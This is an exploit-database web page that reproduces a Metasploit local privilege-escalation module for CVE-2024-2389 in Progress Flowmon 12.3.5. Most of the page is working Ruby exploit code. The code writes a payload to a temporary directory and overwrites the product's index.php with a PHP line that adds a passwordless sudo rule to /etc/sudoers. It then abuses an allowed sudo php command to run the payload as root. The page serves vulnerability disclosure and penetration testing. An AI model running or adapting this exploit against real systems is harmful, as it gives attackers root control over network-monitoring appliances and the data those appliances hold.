---
title: Progress Flowmon 12.3.5 Local sudo Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2024060006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-03
fetch_date: 2025-10-06T17:31:40.327394
---

# Progress Flowmon 12.3.5 Local sudo Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Progress Flowmon 12.3.5 Local sudo Privilege Escalation** **2024.06.02**  Credit:  **[Dave Yesland](https://cxsecurity.com/author/Dave%2BYesland/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **[CVE-2024-2389](https://cxsecurity.com/cveshow/CVE-2024-2389/ "Click to see CVE-2024-2389")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
include Msf::Post::File
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Progress Flowmon Local sudo privilege escalation',
'Description' => %q{
This module abuses a feature of the sudo command on Progress Flowmon.
Certain binary files are allowed to automatically elevate
with the sudo command. This is based off of the file name. This
includes executing a PHP command with a specific file name. If the
file is overwritten with PHP code it can be used to elevate privileges
to root. Progress Flowmon up to at least version 12.3.5 is vulnerable.
},
'Author' => [
'Dave Yesland with Rhino Security Labs',
],
'License' => MSF\_LICENSE,
'References' => [
['URL', 'https://rhinosecuritylabs.com/research/cve-2024-2389-in-progress-flowmon/'],
['URL', 'https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability']
],
'DisclosureDate' => '2024-03-19',
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK],
'Reliability' => [ REPEATABLE\_SESSION ]
},
'SessionTypes' => ['shell', 'meterpreter'],
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_X86, ARCH\_X64],
'Targets' => [['Automatic', {}]],
'Privileged' => true
)
)
register\_options([
OptString.new('WRITABLE\_DIR', [ true, 'A directory where we can write files', '/tmp' ]),
])
end
def check
score = 0
score += 1 if read\_file('/var/www/shtml/index.php')&.include?('FlowMon')
score += 1 if read\_file('/var/www/shtml/ui/manifest.json')&.include?('Flowmon Web Interface')
score += 1 if exists?('/var/www/shtml/translate.php')
vprint\_status("Found #{score} indicators this is a Progress Flowmon product")
return CheckCode::Detected if score > 0
return CheckCode::Safe
end
def on\_new\_session(session)
super
print\_status('Cleaning up addition to /etc/sudoers')
if session.type.to\_s.eql? 'meterpreter'
session.sys.process.execute '/bin/sh', "-c \"sed -i '/^ADMINS ALL=(ALL) NOPASSWD: ALL$/d' /etc/sudoers\""
elsif session.type.to\_s.eql? 'shell'
session.shell\_command\_token 'sed -i \'/^ADMINS ALL=(ALL) NOPASSWD: ALL$/d\' /etc/sudoers'
end
end
def cleanup
super
unless @index\_php\_contents.blank?
print\_status('Restoring /var/www/shtml/index.php file contents...')
file\_rm('/var/www/shtml/index.php')
write\_file('/var/www/shtml/index.php', @index\_php\_contents)
end
end
def exploit
@index\_php\_contents = ''
fail\_with(Failure::BadConfig, "#{datastore['WRITABLE\_DIR']} is not writable") unless writable?(datastore['WRITABLE\_DIR'])
exploit\_file = "#{datastore['WRITABLE\_DIR']}/.#{Rex::Text.rand\_text\_alpha\_lower(6..12)}"
vprint\_status("Saving payload as #{exploit\_file}")
write\_file(exploit\_file, generate\_payload\_exe)
chmod(exploit\_file)
register\_file\_for\_cleanup(exploit\_file)
@index\_php\_contents = read\_file('/var/www/shtml/index.php')
print\_status('Overwriting /var/www/shtml/index.php with payload')
cmd\_exec('echo \'<?php system("echo \\"ADMINS ALL=(ALL) NOPASSWD: ALL\\" >> /etc/sudoers"); ?>\' > /var/www/shtml/index.php;')
print\_status('Executing sudo to elevate privileges')
cmd\_exec('sudo /usr/bin/php /var/www/shtml/index.php Cli\\:AddNewSource s;')
cmd\_exec("sudo '#{exploit\_file}'")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top